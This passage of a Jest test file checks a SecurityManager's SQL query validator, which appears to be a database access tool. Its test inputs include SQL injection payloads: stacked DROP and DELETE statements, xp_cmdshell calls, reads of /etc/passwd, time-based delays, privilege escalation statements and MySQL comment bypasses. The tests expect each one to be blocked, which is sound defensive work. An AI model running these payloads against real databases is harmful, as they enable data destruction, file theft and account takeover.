      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect CONCAT CHAR injection', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT CONCAT( CHAR( 72))');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect WAITFOR DELAY dangerous pattern', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT 1 WAITFOR DELAY '0:0:5'");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect semicolon followed by EXEC', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT 1; EXEC xp_cmdshell 'dir'");
      expect(result.allowed).toBe(false);
    });

    test('should detect semicolon followed by DELETE', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT 1; DELETE FROM users');
      expect(result.allowed).toBe(false);
    });

    test('should detect LOAD_FILE function', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT LOAD_FILE('/etc/passwd')");
      expect(result.allowed).toBe(false);
    });

    test('should detect INTO OUTFILE', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT * INTO OUTFILE '/tmp/data'");
      expect(result.allowed).toBe(false);
    });

    test('should detect BENCHMARK function', () => {
      const result = nonSelectManager.validateAnyQuery("SELECT BENCHMARK(1000000, SHA1('test'))");
      expect(result.allowed).toBe(false);
    });

    test('should detect SLEEP function', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT SLEEP(10)');
      expect(result.allowed).toBe(false);
    });
  });

  describe('SQL Injection via deep validation (SELECT-only mode)', () => {
    test('should detect SELECT INTO OUTFILE via deep validation', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "SELECT * FROM users INTO OUTFILE '/tmp/data.csv'"
      );
      expect(result.allowed).toBe(false);
    });

    test('should detect SELECT with LOAD_FILE via deep validation', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "SELECT LOAD_FILE('/etc/passwd')"
      );
      expect(result.allowed).toBe(false);
    });

    test('should detect SELECT ; DROP via deep validation', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        'SELECT * FROM users; DROP TABLE users'
      );
      expect(result.allowed).toBe(false);
    });

    test('should detect SELECT EXEC via deep validation', async () => {
      const result = await securityManager.validateSelectOnlyQuery('SELECT 1; EXEC xp_cmdshell');
      expect(result.allowed).toBe(false);
    });
  });

  describe('Privilege escalation detection', () => {
    test('should detect CREATE USER attempt', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "CREATE USER 'hacker' IDENTIFIED BY 'pass'"
      );
      expect(result.allowed).toBe(false);
    });

    test('should detect GRANT ALL attempt', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "GRANT ALL PRIVILEGES ON *.* TO 'hacker'"
      );
      expect(result.allowed).toBe(false);
    });

    test('should detect ALTER USER attempt', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "ALTER USER 'root' IDENTIFIED BY 'newpass'"
      );
      expect(result.allowed).toBe(false);
    });

    test('should detect SET PASSWORD attempt', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "SET PASSWORD FOR 'root' = 'newpass'"
      );
      expect(result.allowed).toBe(false);
    });
  });

  describe('Event emissions', () => {
    test('should emit initialized event on initialize()', () => {
      const handler = jest.fn();
      securityManager.on('initialized', handler);

      securityManager.initialize({ databases: {}, security: parsedConfig });
      expect(handler).toHaveBeenCalledWith(expect.objectContaining({ databases: {} }));
    });
  });

  describe('Complexity analysis edge cases', () => {
    test('should return LOW risk for simple queries', () => {
      const analysis = securityManager.analyzeQueryComplexity('SELECT 1');
      expect(analysis.risk_level).toBe('LOW');
      expect(analysis.score).toBeLessThanOrEqual(20);
    });

    test('should return MEDIUM risk for moderately complex queries', () => {
      const analysis = securityManager.analyzeQueryComplexity(
        'SELECT * FROM t1 JOIN t2 ON t1.id = t2.id JOIN t3 ON t2.id = t3.id JOIN t4 ON t3.id = t4.id JOIN t5 ON t4.id = t5.id'
      );
      expect(analysis.risk_level).toBe('MEDIUM');
    });

    test('should return CRITICAL risk for extremely complex queries', () => {
      const sm = new SecurityManager({ security: { ...defaultConfig, max_complexity_score: 50 } });
      const analysis = sm.analyzeQueryComplexity(SampleQueries.complexityTestQueries.manyJoins);
      // 12 joins * 5 = 60 > 50 threshold
      expect(analysis.risk_level).toBe('CRITICAL');
    });

    test('should count window functions', () => {
      const analysis = securityManager.analyzeQueryComplexity(
        'SELECT ROW_NUMBER() OVER (ORDER BY id), RANK() OVER (ORDER BY score) FROM users'
      );
      expect(analysis.windowFuncCount).toBe(2);
      expect(analysis.factors).toEqual(expect.arrayContaining([expect.stringContaining('window')]));
    });

    test('should include length factor in score', () => {
      const shortAnalysis = securityManager.analyzeQueryComplexity('SELECT 1');
      const longQuery = 'SELECT ' + 'a, '.repeat(200) + 'b FROM t';
      const longAnalysis = securityManager.analyzeQueryComplexity(longQuery);
      expect(longAnalysis.score).toBeGreaterThan(shortAnalysis.score);
    });

    test('should count GROUP BY fields from comma-separated list', () => {
      const analysis = securityManager.analyzeQueryComplexity(
        'SELECT a, b, c, COUNT(*) FROM t GROUP BY a, b, c'
      );
      expect(analysis.groupByCount).toBe(3);
    });
  });

  // A SELECT with n JOINs: 5 complexity points each, so up to 19 stay under the default
  // score limit of 100 and the JOIN limit is what decides.
  const joins = (n: number): string =>
    'SELECT * FROM t0' +
    Array.from({ length: n }, (_, i) => ` JOIN t${i + 1} ON t${i}.id = t${i + 1}.id`).join('');
  const joinLimit = (sm: SecurityManager, n: number) => sm.validateSelectOnlyQuery(joins(n));

  describe('Initialize method', () => {
    test('should update complexity limits from config', () => {
      securityManager.initialize({
        databases: {},
        security: {
          max_joins: 20,
          max_subqueries: 10,
          max_unions: 5,
          max_group_bys: 8,
          max_complexity_score: 200,
          max_query_length: 20000,
        },
      });

      expect(joinLimit(securityManager, 20).allowed).toBe(true);
      const over = joinLimit(securityManager, 21);
      expect(over.allowed).toBe(false);
      expect(over.reason).toContain('maximum allowed: 20');
    });

    test('should not change limits when no security config provided', () => {
      securityManager.initialize({ databases: {} });

      expect(joinLimit(securityManager, 10).allowed).toBe(true);
      expect(joinLimit(securityManager, 11).reason).toContain('maximum allowed: 10');
    });
  });

  describe('parseConfigValue via constructor', () => {
    test('should parse string config values', () => {
      const sm = new SecurityManager({
        security: {
          max_joins: '15' as any,
          max_subqueries: '8' as any,
        },
      });
      expect(joinLimit(sm, 15).allowed).toBe(true);
      expect(joinLimit(sm, 16).reason).toContain('maximum allowed: 15');
    });

    test('should use defaults for invalid string values', () => {
      const sm = new SecurityManager({
        security: {
          max_joins: 'abc' as any,
        },
      });
      expect(joinLimit(sm, 11).reason).toContain('maximum allowed: 10'); // default
    });

    test('should use defaults for undefined values', () => {
      const sm = new SecurityManager({});
      expect(joinLimit(sm, 10).allowed).toBe(true);
      expect(joinLimit(sm, 11).reason).toContain('maximum allowed: 10');
    });
  });

  describe('validateAnyQuery - dangerous command blocking', () => {
    let manager: SecurityManager;
    beforeEach(() => {
      manager = new SecurityManager({});
    }); // select_only=false

    it.each(['EXEC sp_foo', 'EXECUTE sp_foo', 'CALL my_proc()'])(
      'blocks %s even in non-SELECT mode',
      async (query) => {
        const result = await manager.validateAnyQuery(query);
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/not allowed/i);
      }
    );

    it('allows INSERT in non-SELECT mode', async () => {
      const result = await manager.validateAnyQuery('INSERT INTO t(a) VALUES (1)');
      expect(result.allowed).toBe(true);
    });
  });

  describe('validateAnyQuery regression', () => {
    let writeManager: SecurityManager;

    beforeEach(() => {
      writeManager = new SecurityManager({ security: defaultConfig });
    });

    test('should block EXEC even in write mode', async () => {
      const result = await writeManager.validateAnyQuery('EXEC xp_cmdshell "dir"');
      expect(result.allowed).toBe(false);
    });

    test('should block LOAD even in write mode', async () => {
      const result = await writeManager.validateAnyQuery(
        "LOAD DATA INFILE '/etc/passwd' INTO TABLE t"
      );
      expect(result.allowed).toBe(false);
    });

    test('should allow INSERT in write mode', async () => {
      const result = await writeManager.validateAnyQuery("INSERT INTO t VALUES (1, 'a')");
      expect(result.allowed).toBe(true);
    });
  });

  describe('SELECT-only bypass: stored proc name substring (C1)', () => {
    // Audit C1: dbSpecificAllowed used command.includes(cmd) (substring match)
    // for MSSQL, so a stored proc named e.g. sp_helpdesk_reset passed validation
    // because 'SP_HELPDESK_RESET'.includes('SP_HELP') is true, and the early
    // return skipped ALL further security checks. Now exact equality is used.
    test('blocks stored proc whose name contains sp_help as substring (mssql)', () => {
      const result = securityManager.validateSelectOnlyQuery('sp_helpdesk_reset', 'mssql');
      expect(result.allowed).toBe(false);
    });

    test('blocks stored proc whose name contains sp_columns as substring (mssql)', () => {
      const result = securityManager.validateSelectOnlyQuery('sp_columns_audit_purge', 'mssql');
      expect(result.allowed).toBe(false);
    });

    test('blocks stored proc whose name contains sp_tables as substring (mssql)', () => {
      const result = securityManager.validateSelectOnlyQuery('sp_tablespace_drop', 'mssql');
      expect(result.allowed).toBe(false);
    });

    test('real sp_help still works but falls through to security checks (mssql)', () => {
      // The exact name sp_help is still allowed as a lead command, but it
      // now falls through to the write-keyword scan and dangerous-pattern check.
      const result = securityManager.validateSelectOnlyQuery('sp_help', 'mssql');
      expect(result.allowed).toBe(true);
    });

    test('blocks sp_help with embedded write keyword (mssql)', () => {
      // Even though sp_help is allowed, an embedded DROP must be caught.
      const result = securityManager.validateSelectOnlyQuery('sp_help; DROP TABLE users', 'mssql');
      expect(result.allowed).toBe(false);
    });
  });

  describe('MySQL version-conditional comment bypass', () => {
    test('should block queries with /*! version-conditional comments', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        'SELECT 1 /*!50000 ; DROP TABLE users */'
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('version-conditional');
    });

    test('should block queries with /*! without version number', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        'SELECT 1 /*! DROP TABLE users */'
      );
      expect(result.allowed).toBe(false);
    });

    test('should still allow normal comments', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        'SELECT /* this is fine */ 1 FROM users'
      );
      expect(result.allowed).toBe(true);
    });
  });
});
